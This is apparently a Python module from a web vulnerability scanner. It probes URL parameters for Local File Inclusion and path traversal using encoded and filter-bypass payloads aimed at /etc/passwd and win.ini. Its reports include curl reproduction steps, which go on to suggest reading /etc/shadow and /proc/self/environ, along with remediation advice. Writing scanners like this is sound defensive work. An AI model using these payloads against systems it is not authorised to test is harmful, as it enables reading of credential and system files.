import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from scanner.core import Finding, Severity, ScanSession, build_curl

LFI_PAYLOADS = [
    ("../../../etc/passwd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("....//....//....//etc/passwd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("..%2f..%2f..%2fetc%2fpasswd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("..%252f..%252f..%252fetc%252fpasswd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("....\\....\\....\\windows\\win.ini", r"^\[fonts\]", "Windows", "C:\\windows\\win.ini"),
    ("../../../windows/win.ini", r"^\[fonts\]", "Windows", "C:\\windows\\win.ini"),
    ("/etc/passwd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("file:///etc/passwd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
]

PATH_TRAVERSAL_PARAMS = [
    "file", "path", "page", "template", "include", "doc", "document",
    "folder", "root", "pg", "style", "pdf", "img", "filename",
    "preview", "load", "read", "content", "download", "view",
]



def _get_traversal_technique(payload):
    if "%252f" in payload:
        return "double URL encoding"
    if "%2f" in payload:
        return "URL encoding"
    if "..../" in payload or "...//" in payload:
        return "filter bypass with nested traversal sequences"
    if "..\\" in payload:
        return "backslash traversal"
    if payload.startswith("file:"):
        return "file:// URI scheme"
    if payload.startswith("/"):
        return "absolute path"
    return "relative path traversal"


def run(session: ScanSession) -> None:
    print("\n[*] Testing for Local File Inclusion / Path Traversal...")

    for url in session.crawled_urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            continue

        for param, values in params.items():
            if param.lower() not in PATH_TRAVERSAL_PARAMS:
                original = values[0] if values else ""
                if not any(c in original for c in "./\\"):
                    continue

            _test_param(session, url, param, values[0] if values else "")

    base_url = session.config.target.rstrip("/")
    for param in PATH_TRAVERSAL_PARAMS[:5]:
        test_url = f"{base_url}?{param}=test"
        resp = session.get(test_url)
        if resp and resp.status_code == 200:
            _test_param(session, test_url, param, "test")


def _test_param(session: ScanSession, url: str, param: str, original: str):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    params[param] = [original or "harmless_value"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    baseline_resp = session.get(baseline_url)
    baseline_text = baseline_resp.text if baseline_resp else ""

    for payload, indicator, target_os, target_file in LFI_PAYLOADS:
        params[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
        resp = session.get(test_url)
        if not resp or resp.status_code in (404, 403):
            continue

        match = re.search(indicator, resp.text, re.IGNORECASE | re.MULTILINE)
        if match and not re.search(indicator, baseline_text, re.IGNORECASE | re.MULTILINE):
            matched_text = match.group(0)
            if _looks_like_passwd(resp.text, indicator) or _looks_like_winini(resp.text, indicator):
                technique = _get_traversal_technique(payload)

                idx = resp.text.find(matched_text)
                snippet_start = max(0, idx - 60)
                snippet_end = min(len(resp.text), idx + len(matched_text) + 60)
                snippet = resp.text[snippet_start:snippet_end].replace('\n', ' ').strip()

                session.add_finding(Finding(
                    title="Local File Inclusion / Path Traversal",
                    severity=Severity.CRITICAL,
                    description=(
                        f"The URL parameter '{param}' is vulnerable to Local File Inclusion (LFI) "
                        f"via {technique}. The application uses user-supplied input to construct "
                        f"file paths without proper validation, allowing an attacker to read "
                        f"arbitrary files from the server's filesystem. The attack successfully "
                        f"retrieved the contents of '{target_file}' on the {target_os} server. "
                        f"This can lead to disclosure of sensitive configuration files, source code, "
                        f"credentials, and in some cases Remote Code Execution through log poisoning "
                        f"or PHP filter chains."
                    ),
                    evidence=(
                        f"Parameter: {param}\n"
                        f"Target OS: {target_os}\n"
                        f"File Retrieved: {target_file}\n"
                        f"Traversal Technique: {technique}\n"
                        f"Payload Sent: {payload}\n"
                        f"Pattern Matched: {matched_text}\n"
                        f"Response Snippet: ...{snippet}...\n"
                        f"Response Status: {resp.status_code}\n"
                        f"Baseline Contained Pattern: No (confirmed not a false positive)"
                    ),
                    remediation=(
                        "1. Never use user input directly in file path construction.\n"
                        "2. Implement a whitelist of allowed file names or identifiers that map to server-side paths.\n"
                        "3. Use os.path.realpath() or equivalent to resolve paths and verify they stay within the intended directory.\n"
                        "4. Strip or reject path traversal characters (../, ..\\, %2f, %252f, null bytes).\n"
                        "5. Run the application with minimal filesystem permissions.\n"
                        "6. Consider using chroot or containerization to limit filesystem access."
                    ),
                    url=url,
                    module="lfi",
                    cwe="CWE-98",
                    confirmed=True,
                    location=f"URL parameter '{param}' in query string",
                    parameter=param,
                    payload=payload,
                    request_method="GET",
                    response_status=resp.status_code,
                    curl_command=build_curl("GET", test_url),
                    reproduction_steps=(
                        f"1. Open the target URL: {url}\n"
                        f"2. Modify the '{param}' parameter value to: {payload}\n"
                        f"3. Send the GET request (full URL: {test_url})\n"
                        f"4. Observe the contents of '{target_file}' in the response body.\n"
                        f"5. The matched pattern '{matched_text}' confirms successful file read.\n"
                        f"6. To test further impact, try reading sensitive files:\n"
                        f"   - Linux: /etc/shadow, /proc/self/environ, application config files\n"
                        f"   - Windows: C:\\inetpub\\wwwroot\\web.config, boot.ini"
                    ),
                    developer_fix=(
                        f"File: The server-side code that handles the '{parsed.path}' route and uses "
                        f"the '{param}' parameter to load or include files.\n"
                        f"\n"
                        f"Fix: Replace direct path concatenation with a whitelist approach.\n"
                        f"Instead of:\n"
                        f"  filepath = os.path.join(base_dir, request.args['{param}'])\n"
                        f"  return open(filepath).read()\n"
                        f"Use:\n"
                        f"  ALLOWED_FILES = {{'page1': 'templates/page1.html', 'page2': 'templates/page2.html'}}\n"
                        f"  page_key = request.args.get('{param}', '')\n"
                        f"  if page_key not in ALLOWED_FILES:\n"
                        f"      abort(404)\n"
                        f"  filepath = ALLOWED_FILES[page_key]\n"
                        f"\n"
                        f"If dynamic paths are necessary, validate the resolved path:\n"
                        f"  import os\n"
                        f"  base = os.path.realpath('/var/www/allowed_dir')\n"
                        f"  target = os.path.realpath(os.path.join(base, user_input))\n"
                        f"  if not target.startswith(base + os.sep):\n"
                        f"      abort(403)  # Path traversal attempt\n"
                        f"  return send_file(target)"
                    ),
                    affected_component=f"Route handler for {parsed.path} - file inclusion logic",
                    references=(
                        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
                        " | https://cwe.mitre.org/data/definitions/98.html"
                        " | https://owasp.org/www-community/attacks/Path_Traversal"
                    ),
                    detection_method="Injected directory traversal sequences (../, ....// , %2e%2e/) targeting /etc/passwd and win.ini into URL parameters. Validated by checking for structural markers (3+ colon-delimited lines for passwd) rather than simple regex, with baseline comparison.",
                ))
                return


def _looks_like_passwd(text: str, indicator: str) -> bool:
    if "root:" not in indicator:
        return True
    lines = [l for l in text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
    return len(lines) >= 3


def _looks_like_winini(text: str, indicator: str) -> bool:
    if "fonts" not in indicator:
        return True
    return "[fonts]" in text.lower() and "[extensions]" in text.lower()
